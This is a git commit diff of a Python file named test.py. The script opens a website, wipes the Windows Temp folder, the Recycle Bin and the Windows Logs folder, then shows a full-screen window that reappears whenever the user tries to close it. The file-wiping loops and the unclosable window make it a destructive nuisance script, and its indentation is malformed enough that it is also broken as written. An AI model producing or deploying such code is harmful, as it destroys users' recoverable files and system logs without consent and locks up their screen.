52ad76c20b8b024bac37b52c5f80051ca0f2d5a7
Kastot <153393126+Kastot@users.noreply.github.com>
2025-03-03 23:35:51 -0500

    test.py

--- test.py
+++ test.py
@@ -1,7 +1,7 @@
 import shutil, os, webbrowser, subprocess, winreg, tkinter as tk, time
 
 
-
+###################################################################################
 def Codescribe():
     webbrowser.open("http://codescribe.tilda.ws")
 
@@ -10,13 +10,15 @@ def Rick():
 
 Codescribe()
 
-time.sleep(2)
+time.sleep(1)
 
 Rick()
-folder = 'c:\windows\Temp'
 
-for filename in os.listdir(folder):
-    file_path = os.path.join(folder, filename)
+###################################################################################
+
+DelTemp = 'c:\windows\Temp'
+for filename in os.listdir(DelTemp):
+    file_path = os.path.join(DelTemp, filename)
     try:
         if os.path.isfile(file_path) or os.path.islink(file_path):
             os.unlink(file_path)
@@ -25,6 +27,7 @@ for filename in os.listdir(folder):
     except Exception as e:
         print('Failed to delete %s. Reason: %s' % (file_path, e))
 
+###################################################################################
 
         DelBin = 'C:\$Recycle.Bin'
 for filename in os.listdir(DelBin):
@@ -37,6 +40,8 @@ for filename in os.listdir(DelBin):
     except Exception as e:
         print('Failed to delete %s. Reason: %s' % (file_path, e))
 
+###################################################################################
+
         DelLogs = 'C:\\Windows\\Logs\\'
 for filename in os.listdir(DelLogs):
     file_path = os.path.join(DelLogs, filename)
@@ -48,5 +53,36 @@ for filename in os.listdir(DelLogs):
     except Exception as e:
         print('Failed to delete %s. Reason: %s' % (file_path, e))
 
+###################################################################################
 
-    
+    import tkinter as tk
+import time
+
+# Function that runs when the user tries to close the window
+def on_closing():
+    print("You're trying to close the window, but it's locked!")
+    lock_window()
+
+# Function to lock the window by hiding it for 2 seconds
+def lock_window():
+    # Hide the window
+    root.withdraw()
+    # Wait for 2 seconds
+    time.sleep(1)
+    # Show the window again
+    root.deiconify()
+
+# Create the root window
+root = tk.Tk()
+
+# Set the title
+root.title("Close_me")
+
+# Set the window size
+root.geometry("1920x1080")
+
+# Bind the closing event to a custom function
+root.protocol("WM_DELETE_WINDOW", on_closing)
+
+# Main loop to keep the window open
+root.mainloop()
